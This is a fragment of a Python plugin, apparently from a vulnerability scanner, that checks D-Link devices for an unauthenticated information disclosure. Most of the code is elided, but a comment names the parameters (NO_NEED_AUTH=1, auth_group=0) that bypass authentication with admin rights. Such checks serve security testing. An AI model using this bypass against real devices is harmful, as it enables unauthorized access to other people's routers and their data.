...
@software: PyCharm
@file: dlink_unauthority_info_disclosure.py
@time: 2018/12/3 16:26
@refer: https://www.cnblogs.com/HacTF/p/8052279.html
@info: 
@desc: 
'''
...
class P(T):
	...
	def verify(self, head='', context='', ip='', port='', productname={}, keywords='', hackresults=''):
		...
		result = {}
		result['result'] = False
		# NO_NEED_AUTH=1无需进行身份验证，auth_group=0代表admin权限
		payload = (
...
def output(url, result, label):
	...
	result['VerifyInfo']['payload'] = '/thirdparty/d-link/d-link_aafcc785bc4272b60279b6bedd38d27f.py'
